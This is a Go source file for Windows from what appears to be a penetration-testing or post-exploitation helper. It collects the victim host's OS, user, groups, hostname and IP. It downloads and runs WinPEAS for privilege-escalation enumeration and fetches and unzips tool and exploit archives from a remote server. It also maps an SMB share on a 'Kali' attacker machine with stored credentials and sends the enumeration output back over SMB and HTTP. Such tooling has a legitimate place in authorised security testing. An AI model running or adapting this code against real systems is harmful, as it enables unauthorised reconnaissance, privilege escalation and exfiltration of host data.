//go:build windows

package cmd

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/wille/osutil"
)

func HandleExit() {
	fmt.Println()
}

func GetOSDetails() {
	// Get OS version, current user, privileges, IP address and Hostname and assign these to the variables in variables.go
	OS = fmt.Sprintf("%s [%s]", osutil.GetDisplay(), osutil.GetDisplayArch())

	currentUser, _ := user.Current()
	if strings.Contains(currentUser.Username, "\\") {
		CurrentUser = strings.Split(currentUser.Username, "\\")[1]
	} else {
		CurrentUser = currentUser.Username
	}
	CurrentGroups = getUserGroups(currentUser)
	HostName, _ = os.Hostname()
	IPAddress, _ = GetLocalIP()

}

func getUserGroups(currUser *user.User) []string {

	var Groups []string

	// Lookup user groups by id
	groups, err := currUser.GroupIds()
	if err != nil {
		Log.Errorf("Error getting user groups: %v\n", err)
	} else {
		// Loop through groups and get the group name
		for _, group := range groups {
			g, err := user.LookupGroupId(group)
			if err != nil {
				Log.Errorf("Error getting group name: %v\n", err)
			} else {
				// Add Group name to list
				Groups = append(Groups, g.Name)
			}
		}
	}
	return Groups
}

func CheckShare() {
	CheckUpload()
	SmbShareFull = fmt.Sprintf("%s\\%s", SmbShareDriveWin, SmbShare)
	_, err := os.Open(SmbShareDriveWin + "\\")
	if err != nil {
		cmd := exec.Command("net", "use", SmbShareDriveWin, "\\\\"+KaliMachine+"\\"+SmbShare, "/u:"+SmbShareUser, SmbSharePassword, "/persistent:yes")
		//cmd := exec.Command("cmd", "/C", fullCommand)
		_, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
			SmbShareStatus = "Error"
			return
		}
		SmbShareStatus = "OK"
		return
	} else {
		SmbShareStatus = "OK"
		return
	}

}

func CheckUpload() {
	url := fmt.Sprintf("http://%s:%d/", KaliMachine, UploadServerPort)
	UploadServerFull = url
	resp, err := http.Get(url)
	if err != nil {
		UploadServerStatus = "Error"
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		UploadServerStatus = "OK"
		return
	} else {
		UploadServerStatus = string(resp.StatusCode)
		return
	}
}

func CheckWorkspaceDirectories() {
	// Check if the workspace directories exist
	if _, err := os.Stat(WinTempPath); os.IsNotExist(err) {
		err := os.MkdirAll(WinTempPath, os.ModePerm)
		if err != nil {
			Log.Errorf("Error creating directory: %v\n", err)
			return
		}
	}
	if _, err := os.Stat(filepath.Join(WinTempPath, "tools")); os.IsNotExist(err) {
		err := os.MkdirAll(filepath.Join(WinTempPath, "tools"), 0755)
		if err != nil {
			Log.Errorf("Error creating directory: %v\n", err)
			return
		}
	}
	if _, err := os.Stat(filepath.Join(WinTempPath, "exploits")); os.IsNotExist(err) {
		err := os.MkdirAll(filepath.Join(WinTempPath, "exploits"), 0755)
		if err != nil {
			Log.Errorf("Error creating directory: %v\n", err)
			return
		}
	}
}

func UploadSMBFile(lpath string) {
	// Description: Upload a file to the SMB share
	// Example: copy /Y C:\path\to\file.txt \\
	// Check if directory exists, otherwise create a directory in the smb share with the IP address of the host machine

	// Check if the directory exists
	if _, err := os.Stat(SmbShareFull); os.IsNotExist(err) {
		// Create the directory
		err := os.MkdirAll(filepath.Join(SmbShareFull, IPAddress), os.ModePerm)

		if err != nil {
			Log.Errorf("Error creating directory: %v\n", err)
			return
		}
	}

	cmd := exec.Command("cmd", "/C", "copy", "/Y", lpath, filepath.Join(SmbShareFull, IPAddress))
	_, err := cmd.CombinedOutput()
	if err != nil {
		Log.Errorf("Error copying file: %v\n", err)
		return
	} else {
		Log.Infof("File %s copied successfully to SMB Share\n", lpath)
		return
	}
}

func GenerateFileName(fileName string) (string, string) {
	fileName = fmt.Sprintf("%s_%s_%s-%s.txt", IPAddress, HostName, CurrentUser, fileName)
	filePath := filepath.Join(WinTempPath, fileName)
	return fileName, filePath
}

func RunPEAS() {
	Log.Info("Running WinPEAS...")

	BaseUrl, err := url.Parse(HttpServerFull)

	if err != nil {
		Log.Errorf("Error parsing URL: %v\n", err)
		os.Exit(1)
	}

	WinPeasPath := BaseUrl.JoinPath(WinToolsPath, Winpeas_file)
	WinPeasBin := filepath.Base(Winpeas_file)

	file, err := DownloadFile(WinPeasPath.String(), WinTempPath, WinPeasBin)
	if err != nil {
		fmt.Println(err)
		return
	}
	_, fileOutPath := GenerateFileName("WinPEAS")
	Log.Infof("Output file: %s", fileOutPath)

	outFile, err := os.Create(fileOutPath)
	if err != nil {
		Log.Errorf("Error creating output file: %v\n", err)
		return
	}
	defer outFile.Close()

	cmd := exec.Command("cmd", "/c", file, "-a")

	mw := io.MultiWriter(os.Stdout, outFile)
	// write output to file
	cmd.Stdout = mw
	cmd.Stderr = os.Stderr
	_ = cmd.Run()

	Log.Info("PEAS Script completed")
	// Upload the file to the HTTP Server
	UploadFile(fileOutPath, fmt.Sprintf("%s%s", HttpServerFull, UploadServerFull))
	UploadSMBFile(fileOutPath)
	return
}

func DownloadAllTools() {

	// Description: Download all the tools
	BaseUrl, err := url.Parse(HttpServerFull)

	if err != nil {
		Log.Errorf("Error parsing URL: %v\n", err)
		os.Exit(1)
	}

	winToolsPath, _ := url.QueryUnescape(BaseUrl.JoinPath(WinToolsPath, GoHTTPDownloadZip).String())
	winExploitPath, _ := url.QueryUnescape(BaseUrl.JoinPath(WinExploitsPath, GoHTTPDownloadZip).String())

	_, err = DownloadFile(winToolsPath, WinTempPath, "win_tools.zip")
	if err != nil {
		Log.Errorf("Error downloading tools: %v\n", err)
		return
	}

	ToolsZipPath := filepath.Join(WinTempPath, "win_tools.zip")

	_, err = DownloadFile(winExploitPath, WinTempPath, "win_exploits.zip")

	if err != nil {
		Log.Errorf("Error downloading exploits: %v\n", err)
		return
	}

	// Unzip the files
	err = UnzipDirToPath(ToolsZipPath, filepath.Join(WinTempPath, "tools"))
	if err != nil {
		Log.Errorf("Error unzipping tools: %v\n", err)
		return
	}

	ExploitZipPath := filepath.Join(WinTempPath, "win_exploits.zip")

	err = UnzipDirToPath(ExploitZipPath, filepath.Join(WinTempPath, "exploits"))
	if err != nil {
		Log.Errorf("Error unzipping exploits: %v\n", err)
		return
	}

	Log.Info("All tools downloaded")
}
